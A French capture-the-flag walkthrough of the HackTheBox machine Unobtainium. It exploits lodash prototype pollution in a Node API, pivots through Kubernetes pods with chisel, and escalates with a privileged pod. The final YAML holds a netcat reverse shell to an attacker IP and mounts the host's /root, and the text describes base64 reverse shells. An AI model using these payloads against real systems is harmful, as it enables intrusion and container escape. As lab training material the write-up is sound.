Enumération web

Quand je me rends sur le site sur le port 80, on retrouve une page Unobtainium avec la possibilité de télécharger trois fichiers, un .deb, un .rpm et un .snap.

Je télécharge le fichier unobtainium_debian.zip pour l’analyser

Décompression de l’archive et on se retrouve avec une fichier unobtainium_1.0.0_amd64.deb

Création d’un dossier /deb et extraction du paquet .deb

On retrouve deux dossier /opt et /usr. Dans le dossier /opt, il y a un dossier /unobtainium qui contient une application Unobtainium Chat, je peux l’exécuter avec la commande sudo ./unobtainium en précisant --no-sandbox comme paramètre.

L’application contient plusieurs onglets :

  • Dashboard
  • Message Log
  • Post Messages
  • Todo

L’onglet Message Log est intéressant, car il contient un utilisateur potientiel felamos. C’est aussi le pseudo du créateur de la box donc on est certainement sur la bonne voie.

L’autre onglet intéressant est Todo, car il contient une liste de choses à faire qui ressemble à un format en JSON. On peut voir qu’il faut mettre à jour de l'API node JS, améliorer la sécurité ou encore Ajouter une fonctionnalité de connexion.

Je ferme l’application pour poursuivre l’énumération et retrouve un dossier /resources qui contient un fichier app.asar, un fichier asar est une archive utilisée pour empaqueter le code source d’une application utilisant Electron. Je peux l’extraire en utilisant la commande asar e app.asar .

J’ouvre tous les fichiers dans VSCodium et après investigation, on retrouve le fichier todo.js qui contient des credentials felamos:Winter2021 dans le dossier /src/js.

On peut voir qu’il y a une URL http://unobtainium.htb:31337/todo, si j’y vais je tombe le message Cannot GET /todo

J’intercepte la requête avec burp et je l’envoie vers le répéteur avec CTRL+r, si je clique sur Send, j’ai la même réponse.

Clique droit -> Change request method pour la transformer en POST puis Send

J’ajoute les informations d’authentification du fichier todo.js et transforme le type de contenu en json

J’obtiens maintenant une réponse positive avec le même résultat que l’onglet Todo de l’application Unobtainium Chat, si je lance le champ filename vide, je tombe sur une erreur de la part du serveur et le résultat nous donne des noms de plusieurs fichiers intéressants comme index.js, route.js etc.

Si je rentre index.js qui fait parti des fichiers du code source, j’ai une réponse positive avec plusieurs indications

Et si je modifie le fichier pour mettre celui d’en dessous package.json, j’ai une autre réponse avec plusieurs dépendances de l’application et leur version :

  • express 4.16.4
  • google-cloudstorage-commands 0.0.1
  • lodash 4.17.4

Première connexion - webapp pod

Après avoir effectué plusieurs recherches d’exploit correspondant au nom de la dépendance et de sa version, je suis tombé sur la vulnérabilité prototype pollution pour les versions inférieur à 4.17.11 de lodash. Prototype Pollution est une vulnérabilité affectant JavaScript. Elle fait référence à la possibilité d’injecter des propriétés dans les prototypes de construction existants du langage JS, tels que les objets.

La première chose à faire est de nous donner les permissions pour télécharger des fichiers, on peut le faire à l’aide de la commande curl en ajoutant les données message":{"__proto__":{"canUpload":true}}}

Pour terminer j’encode un reverse bash en base64, je l’ajoute dans le champ filename, le décode et l’exécute. J’obtiens un shell en tant que root.

Je peux récupérer le premier flag user.txt.

Mouvement latéral - devnode pod

Après une énumération basique, lancement de linpeas sur la target

Rapidement, on retrouve un crontab qui indique que tous les fichiers nommés kubectl sont automatiquement supprimé. kubectl est l’outil en ligne de commande de l’application Kubernetes.

Il n’existe pas sur la target, je vais le télécharger à l’aide de ce lien et le transférer dessus après l’avoir renommé en kubebctluks

Je lui assigne les droits d’éxécution et affiche la version pour ’m’assurer que tout fonctionne correctement.

Dans cet article on peut voir que Kubernetes prend en charge plusieurs clusters virtuels présents sur le même cluster physique, ils sont appelés namespaces, on peut utiliser la commande get pour les afficher.

On retrouve les quatre espace de nommage initiaux default, kube-node-lease, kube-public, kube-system et un autre dev. Je souhaite afficher les pods disponible, mais ça ne fonctionne pas car je ne peux pas lister les ressources du namespace default. Un pod est un groupe d’un ou plusieurs conteneur avec un stockage et réseau partagé, il existe deux types de pods, à conteneur simple et multiples. A l’aide de cet article, je trouve la solution en ajoutant le flag --namespace.

Il y a trois pods, on peut aller un peu plus loin et afficher les IPs et le noeud qui héberge les pods en ajoutant la commande -o wide

On a trois pods situé dans le noeuf unobtainium qui possèdent les IPs:

  • devnode-deployment-cd86fb5c-6ms8d : 172.17.0.9
  • devnode-deployment-cd86fb5c-mvrfz : 172.17.0.7
  • devnode-deployment-cd86fb5c-qlxww : 172.17.0.5

Je peux utiliser la commande describe pour afficher les détails d’un objet kubernetes comme l’indique ce cheatsheet. Après énumération et si je comprends bien l’explication de cet article, on retrouve trois répliques du pod devnode-deployment avec le ReplicaSet cd86fb5c ayant chacun une adresse unique. Si j’affiche les détails, ils contiennent tous une image localhost:5000/node_server qui tourne sur le port 3000.

Il y a donc deux environnements différents webapp et devnode. Pour continuer, je vais devoir pivoter vers cet environnement en faisant du port forwarding de l’un des trois conteneurs ci-dessus. J’utilisais chisel pour cela, la première chose à faire est de le télécharger et le transférer sur la target.

Maintenant que c’est fait, (1) on exécute le server chisel sur la machine d’attaque sur le port 4444 et (2) le client chisel sur la target. Comme précédemment (3) j’exécute la commande pour exploiter la vulnérabilité prototype pollution, mais cette fois-ci en localhost sur le port 3000. (4) on encode un reverse shell TCP bash et exécute la même commande que précédemment pour récupèrer un shell sur le pod devnode-deployment.

A nouveau, je transfère le binaire kubectluks sur la nouvelle target et lui assigne les droits d’exécution.

Elévation de privilèges - root

Je peux le récupérer en affichant les détails du secret.

Maintenant que je dispose du token de l’admin, je peux l’utiliser pour afficher des information sur le cluster avec la commande cluster-info pour retrouver notamment l’adresse du master et des services

En faisant une recherche avec les mots clés privilege escalation kubernetes with token, je retrouve cet article de BishopFox qui présente plusieurs façons de faire une élévation de privilèges sur k8s et notamment par le biais de la création de pods. Je vais donc vérifier si j’ai la possibilité de le faire

La réponse est oui ! Je vais donc utiliser le repo de badPods pour obtenir un reverse shell.

lukspod.yaml

apiVersion: v1
kind: Pod
metadata:
  name: lukspod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: lukspod
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.149 9002 >/tmp/f; sleep 100000']
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /root
      name: noderoot
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /root/

Je transfère le fichier sur la target et j’ouvre un listener sur le port 9002. Pour terminer je créer le nouveau pod à partir du fichier .yaml pour obtenir un reverse shell et récupérer le dernier flag root.txt. 😊
